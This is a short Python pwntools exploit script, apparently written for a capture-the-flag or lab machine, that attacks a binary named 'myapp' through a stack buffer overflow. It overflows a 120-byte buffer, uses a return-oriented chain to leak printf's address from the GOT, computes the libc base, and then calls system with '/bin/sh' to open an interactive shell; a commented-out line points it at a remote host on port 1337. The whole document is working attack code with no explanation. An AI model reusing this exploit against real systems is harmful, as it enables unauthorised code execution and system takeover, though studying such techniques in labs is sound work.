#!/usr/bin/env python

from pwn import *
import time

context(arch='amd64',os='linux')
e = ELF('./myapp')
libc = ELF('./libc.so.6')
p = process('./myapp')
#p = remote('10.10.10.147',1337)

padding = "A"*120
puts_plt = p64(e.plt['printf'])
puts_got = p64(e.got['printf'])
pop_rdi = p64(0x40120b)
main = p64(0x40115f)
payload = padding + pop_rdi + puts_got + puts_plt + main

time.sleep(5)
f = open('payload','wt')
f.write(payload)
p.sendline(payload)
p.recvline()
p.recvline()
p.recvline()
p.recvline()
leak = p.recvline()
print leak
leak = u64(leak.strip().ljust(8,"\x00"))
print leak

lba = leak - libc.symbols['printf']
#system = p64(lba + 0x449c0)
system = p64(0x401040)
bin_sh = p64(lba + 0x181519)
pop_rdi = p64(e.search(asm('pop rdi;ret')).next())
print pop_rdi 
payload = padding + pop_rdi + bin_sh + system

time.sleep(5)

p.sendline(payload)
p.interactive()
